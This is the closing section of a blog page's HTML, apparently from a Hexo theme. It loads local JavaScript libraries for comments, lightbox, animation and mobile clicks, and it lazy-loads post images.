  	<script src="/js/hook-duoshuo.js"></script>
  

    
  
  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.1"></script>


  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.1"></script>
  

  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>

  <script type="text/javascript" src="/js/motion_global.js?v=0.4.5.1" id="motion.global"></script>




  <script type="text/javascript" src="/js/nav-toggle.js?v=0.4.5.1"></script>
  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  

  <script type="text/javascript">
    $(document).ready(function () {
      if (CONFIG.sidebar === 'always') {
        displaySidebar();
      }
      if (isMobile()) {
        FastClick.attach(document.body);
      }
    });
  </script>

  

  
  

  
  <script type="text/javascript" src="/js/lazyload.js"></script>
  <script type="text/javascript">
    $(function () {
      $("#posts").find('img').lazyload({
        placeholder: "/images/loading.gif",
        effect: "fadeIn"
      });
    });
  </script>
</body>
</html>
